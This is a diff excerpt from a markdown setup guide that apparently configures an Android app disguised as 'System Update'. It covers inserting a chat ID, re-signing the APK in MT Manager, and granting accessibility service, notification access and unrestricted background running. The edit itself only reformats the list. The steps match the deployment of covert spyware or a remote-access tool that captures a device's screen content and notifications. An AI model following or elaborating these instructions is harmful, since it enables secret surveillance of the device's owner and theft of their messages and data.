@@ -50,10 +50,13 @@ Now, search for : YOUR_CHAT_ID_HERE
 
 ◦ MT Manager will ask to Sign the APK. Ensure "Auto-sign" is checked and click OK.
 
-*   **Crucial**: Grant the following manual permissions for full functionality:
-        *   **Accessibility Service**: Enable "System Update" service.
-        *   **Notification Access**: Enable for "System Update".
-        *   **Battery Optimization**: Allow the app to run without restrictions.
+**Crucial**: Grant the following manual permissions for full functionality:
+
+   *   **Accessibility Service**: Enable "System Update" service.
+    
+   *   **Notification Access**: Enable for "System Update".
+
+   *   **Battery Optimization**: Allow the app to run without restrictions.
 
 
 ⚠️ Common Mistakes to Avoid:
